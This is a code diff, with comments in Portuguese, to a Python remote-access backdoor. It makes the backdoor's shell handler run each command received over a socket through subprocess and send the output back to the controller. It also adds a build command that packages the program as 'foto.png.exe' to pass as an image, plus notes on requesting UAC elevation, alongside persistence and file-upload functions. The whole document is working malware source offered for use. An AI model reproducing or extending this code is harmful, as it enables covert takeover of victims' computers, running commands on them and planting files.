@@ -16,9 +16,16 @@ import subprocess
 import tempfile
 
 nome_arquivo='backdoor.exe'
-TEMPDIR = tempfile.gettempdir() #
+TEMPDIR = tempfile.gettempdir()
 
-# pyinstaller -F --clean -w backdoor.py -i icone.png
+'''
+ pyinstaller -F --clean -w backdoor.py -i icone.png -n foto.png.exe
+ testar ->
+--uac-admin           Using this option creates a Manifest which will
+                        request elevation upon application restart.
+  --uac-uiaccess        Using this option allows an elevated application to
+                        work with Remote Desktop.
+'''
 
 def persistencia():
     if(not os.getcwd() == TEMPDIR):
@@ -43,6 +50,7 @@ def executa(socket):
                 return
             else:
                 try:
+                    print(dados)
                     if(dados=='upload'): # upload
                         nome_arquivo = socket.recv(1024)
                         f = open(nome_arquivo,'wb')
@@ -52,10 +60,15 @@ def executa(socket):
                             l = sc.recv(1024)
 
                     elif(dados=='shell'): # shell
-                        dados = ' '.join(dados)
-                        comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
-                        retorno = comando.stdout.read() + comando.stderr.read()
-                        socket.send(retorno)
+                        while True:
+                            if(not dados or dados=='/exit'):
+                                break
+                            else:
+                                dados = socket.recv(1024)
+                                print(dados)
+                                comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
+                                retorno = comando.stdout.read() + comando.stderr.read()
+                                socket.send(retorno)
                     elif(dados=='download'):
                         pass
                 except:
